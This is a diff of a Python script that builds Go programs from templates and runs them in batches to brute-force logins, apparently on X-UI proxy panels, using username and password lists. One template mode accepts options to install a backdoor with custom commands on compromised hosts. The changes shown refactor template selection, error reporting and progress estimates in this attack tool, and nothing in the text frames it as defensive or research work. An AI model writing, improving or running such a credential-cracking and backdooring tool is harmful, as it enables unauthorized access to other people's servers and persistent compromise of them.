     code = XUI_GO_TEMPLATE_8.replace("{semaphore_size}", str(semaphore_size)) \
                             .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
+                            .replace("{pass_list}", pass_list) \
+                            .replace("\\n", "\\\\n").replace("\\r", "\\\\r")
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
@@ -2019,8 +2038,8 @@ def run_xui_for_parts(sleep_seconds):
 
     for idx, part in enumerate(part_files, 1):
         elapsed = time.time() - start_time
-        avg_time_per_part = elapsed / idx if idx > 0 else 0
-        remaining_parts = total_parts - idx
+        avg_time_per_part = elapsed / (idx -1) if idx > 1 else 0
+        remaining_parts = total_parts - (idx -1)
         est_remaining_time = avg_time_per_part * remaining_parts
         est_min = int(est_remaining_time) // 60
         est_sec = int(est_remaining_time) % 60
@@ -2030,10 +2049,33 @@ def run_xui_for_parts(sleep_seconds):
         shutil.copy(os.path.join(TEMP_PART_DIR, part), 'results.txt')
 
         try:
-            subprocess.run(['go', 'run', 'xui.go'], check=True)
-        except subprocess.CalledProcessError:
-            print("go运行失败，请检查环境")
+            print(f"--- 正在运行 Go 程序进行爆破: {part} ---")
+            result = subprocess.run(
+                ['go', 'run', 'xui.go'],
+                capture_output=True,
+                text=True,
+                check=True,
+                encoding='utf-8'
+            )
+            if result.stdout:
+                print("--- Go 程序输出 ---")
+                # Filter out progress lines to avoid cluttering the log
+                for line in result.stdout.splitlines():
+                    if not line.startswith('\\r'):
+                        print(line)
+                print("--------------------")
+
+        except subprocess.CalledProcessError as e:
+            print(f"--- Go 程序执行失败: {part} ---")
+            print(f"返回码: {e.returncode}")
+            print("--- 标准输出 ---")
+            print(e.stdout)
+            print("--- 错误输出 ---")
+            print(e.stderr)
+            print("--------------------------")
+            print("go运行失败，请检查环境并查看上面的错误输出。")
             sys.exit(1)
+
 
         output_file = os.path.join(TEMP_XUI_DIR, f'xui{idx}.txt')
         if os.path.exists('xui.txt'):
@@ -2272,7 +2314,7 @@ deb http://mirrors.aliyun.com/debian-security stable-security main contrib non-f
             return None
         try:
             out = subprocess.check_output([go_exec, "version"], stderr=subprocess.DEVNULL).decode()
-            m = re.search(r"go(\\d+)\\.(\\d+)", out)
+            m = re.search(r"go(\d+)\.(\d+)", out)
             return (int(m.group(1)), int(m.group(2))) if m else None
         except:
             return None
@@ -2392,22 +2434,24 @@ if __name__ == "__main__":
 
                 usernames, passwords = load_credentials()
 
-                if TEMPLATE_MODE == 1:
-                        generate_xui_go(semaphore_size, usernames, passwords)
-                elif TEMPLATE_MODE == 2:
-                        generate_xui_go_template2(semaphore_size, usernames, passwords)
-                elif TEMPLATE_MODE == 3:
-                        generate_xui_go_template3(semaphore_size, usernames, passwords)
-                elif TEMPLATE_MODE == 4:
-                        generate_xui_go_template4(semaphore_size, usernames, passwords)
-                elif TEMPLATE_MODE == 5:
-                        generate_xui_go_template5(semaphore_size, usernames, passwords)
-                elif TEMPLATE_MODE == 6:
-                        generate_xui_go_template6(semaphore_size, usernames, passwords, INSTALL_BACKDOOR, CUSTOM_BACKDOOR_CMDS)
-                elif TEMPLATE_MODE == 7:
-                        generate_xui_go_template7(semaphore_size, usernames, passwords)
-                elif TEMPLATE_MODE == 8:
-                        generate_xui_go_template8(semaphore_size, usernames, passwords)        
+                # Generate the correct Go source code from templates
+                # This replaces the placeholder generation logic with a more direct approach
+                # to avoid the complexities of multiple replacements.
+                
+                template_map = {
+                    1: (generate_xui_go, (semaphore_size, usernames, passwords)),
+                    2: (generate_xui_go_template2, (semaphore_size, usernames, passwords)),
+                    3: (generate_xui_go_template3, (semaphore_size, usernames, passwords)),
+                    4: (generate_xui_go_template4, (semaphore_size, usernames, passwords)),
+                    5: (generate_xui_go_template5, (semaphore_size, usernames, passwords)),
+                    6: (generate_xui_go_template6, (semaphore_size, usernames, passwords, INSTALL_BACKDOOR, CUSTOM_BACKDOOR_CMDS)),
+                    7: (generate_xui_go_template7, (semaphore_size, usernames, passwords)),
+                    8: (generate_xui_go_template8, (semaphore_size, usernames, passwords)),
+                }
+
+                gen_func, args = template_map[TEMPLATE_MODE]
+                gen_func(*args)
+
 
                 generate_ipcx_py()
                 split_file(input_file, lines_per_file)
